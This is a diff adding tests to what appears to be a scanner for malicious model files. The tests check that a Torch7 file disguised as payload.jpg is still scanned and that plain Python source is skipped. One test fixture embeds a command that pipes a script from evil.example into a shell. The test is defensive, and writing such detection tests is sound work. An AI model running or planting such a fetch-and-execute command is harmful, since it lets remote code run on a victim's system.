@@ -252,6 +252,30 @@ class TestDirectoryFileFiltering:
 
         assert results["files_scanned"] == 0
 
+    def test_disguised_torch7_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve signature-valid Torch7 payloads despite misleading suffixes."""
+        disguised_torch7 = tmp_path / "payload.jpg"
+        disguised_torch7.write_bytes(
+            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "torch7" in results.scanner_names
+        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_torch_source_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        """Source files naming torch modules must not route as serialized Torch7."""
+        source_near_match = tmp_path / "source.jpg"
+        source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
     def test_disguised_llamafile_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve executable Llamafiles despite misleading suffixes."""
         disguised_llamafile = tmp_path / "payload.jpg"
